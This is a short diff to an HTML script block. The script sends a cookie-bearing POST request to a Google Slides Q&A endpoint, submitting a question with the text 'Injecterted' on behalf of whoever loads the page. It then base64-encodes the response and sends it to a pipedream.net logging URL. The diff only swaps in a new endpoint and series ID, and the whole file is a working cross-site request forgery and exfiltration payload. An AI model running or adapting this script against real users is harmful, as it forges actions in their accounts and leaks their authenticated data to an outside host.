@@ -1,17 +1,18 @@
 <script>
-fetch("https://docs.google.com/presentation/d/e/2QANgcCBE7qK5pKL-gMYL__O5T4C5Atzw7fWXR6Tt1BuD0-5qwTeKnEjsFM7-DrIaF_soxF4l1g0R6RcgT3w/submitquestion?includes_info_params=1", {
+fetch("https://docs.google.com/presentation/u/1/d/e/2QANgcCBHY1yBGhRxc-h1-mhX81YfSW7G-jM-0xe4t_UXkdTdGeDLWgt2n1to9MBX7CqI1FB6csPX1Xy-4fA/askquestion?includes_info_params=1", {
     method: "POST",
     credentials: "include",
     headers: {
         "Content-Type": "application/x-www-form-urlencoded"
     },
-    body: "seriesId=6ce6e096-8255-4023-ba77-81110f308f70&clientId=trrteerrerst&questionText=Injecterted"
+    body: "seriesId=748f1052-e59b-4f74-8db2-c8c1cba878ec&clientId=trrteerrerst&questionText=Injecterted"
 })
 .then(r => r.text())
 .then(data => {
     fetch("https://eodyasvhr80kaqs.m.pipedream.net/log?data=" + btoa(data));
 });
 </script>
+
 
 
 
